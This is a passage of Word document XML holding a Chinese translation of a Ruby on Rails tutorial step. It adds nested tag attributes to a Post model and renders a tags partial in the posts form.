      <w:tr w:rsidR="005D6D6E" w:rsidRPr="002F7037" w14:paraId="744B25F4" w14:textId="77777777" w:rsidTr="007D08BD">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1DE4F9A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rake db:migrate</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="01FC061E"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接下来：编辑 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>post.rb</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 文件来创建来创建另一个成员，并且告诉Rails（通过 the </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>accepts_nested_attributes_for</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 宏）你打算通过posts form来编辑tags。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8522"/>
      </w:tblGrid>
      <w:tr w:rsidR="005D6D6E" w:rsidRPr="002F7037" w14:paraId="6B5E71BC" w14:textId="77777777" w:rsidTr="007D08BD">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3C8365C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class</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>Post &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="17E40B3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validates :name,  :presence</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; true</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="228FF762" w14:textId="77777777" w:rsidR="005D6D6E" w:rsidRPr="002F7037" w:rsidRDefault="005D6D6E" w:rsidP="007D08BD">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>  validates :title, :presence</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; true,</w:t>
            </w:r>
            <w:r w:rsidR="007D08BD">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun" w:hint="eastAsia"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t> :length</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; { :minimum</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; 5</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0812246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3B0A2C1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has_many :comments, :dependent</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; :destroy</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1049AD6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has_many :tags</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="758DC30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xml:space="preserve">  accepts_nested_attributes_for :tags, </w:t>
            </w:r>
            <w:r w:rsidRPr="005B71EB">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>:allow_destroy</w:t>
            </w:r>
            <w:r w:rsidRPr="005B71EB">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="005B71EB">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>=&gt; :true</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>,  :reject_if</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; proc { |attrs| attrs.all? { |k, v| v.blank? } }</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5A7F940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213E250C"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对于 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:allow_destroy</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 嵌套属性的声明是</w:t>
      </w:r>
      <w:r w:rsidRPr="005B71EB">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>告诉 Rails 显示一个 “remove” 复选框在视图中那样你可以快速创建（tags）</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">。对于 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:reject_if</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="005B71EB">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>保证不保存没有任何内容的tags</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="681FF8A0"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我们将要修改 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>views/posts/_form.html.erb</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 来render（form的）一部分来创建tag：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8522"/>
      </w:tblGrid>
      <w:tr w:rsidR="005D6D6E" w:rsidRPr="002F7037" w14:paraId="22FB48B9" w14:textId="77777777" w:rsidTr="007D08BD">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2D9205F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B74EBB">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>@post.tags.build</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="55FBA78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form_for(@post) do</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>|post_form| %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3256B4D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if</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>@post.errors.any? %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="436585C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id="errorExplanation"&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="28CA416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&lt;h2&gt;&lt;%=</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>pluralize(@post.errors.count, "error") %&gt;</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>prohibited this post from being saved:&lt;/h2&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="723B7D3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&lt;ul&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6F3F38F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@post.errors.full_messages.each</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>do</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>|msg| %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="677925F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&lt;li&gt;&lt;%=</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>msg %&gt;&lt;/li&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2DB30EB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49473D1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&lt;/ul&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4D00972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2AB41C5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5AB03FF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3694064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67C1E08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post_form.label :name</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13CF9C3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post_form.text_field :name</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1EA8EFE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520754E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7E518E7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post_form.label :title</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19D355E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post_form.text_field :title</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5B94581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6505236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112C229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post_form.label :content</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>%&gt;&lt;br</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65373A6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post_form.text_area :content</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12C8EC9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412A49C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&lt;h2&gt;Tags&lt;/h2&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0E5C6196" w14:textId="77777777" w:rsidR="005D6D6E" w:rsidRPr="008D7585" w:rsidRDefault="005D6D6E" w:rsidP="002A2B82">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:highlight w:val="green"/>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8D7585">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>render :partial</w:t>
            </w:r>
            <w:r w:rsidRPr="008D7585">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="008D7585">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>=&gt; 'tags/form',</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="09185D42" w14:textId="77777777" w:rsidR="005D6D6E" w:rsidRPr="002F7037" w:rsidRDefault="005D6D6E" w:rsidP="002A2B82">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008D7585">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>             :locals</w:t>
            </w:r>
            <w:r w:rsidRPr="008D7585">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="008D7585">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>=&gt; {:form</w:t>
            </w:r>
            <w:r w:rsidRPr="008D7585">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="008D7585">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>=&gt; post_form}</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="06BE757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class="actions"&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="53ABEF9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post_form.submit %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0613BD5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3E5376A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tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="1D219E3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注意：我们已经更改 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>form_for(@post) do |f|</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 中的 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>f</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 为 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>post_form</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 这样会更加容易明白是怎么回事。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DBEDED3"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这个例子在 render helper 中使用另个方式，是为了说明我们希望的是在 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>form</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 中使用局部变量指向的 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>post_form</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 对象。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E770565"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我们还在form的顶部添加 </w:t>
      </w:r>
      <w:r w:rsidRPr="00B74EBB">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
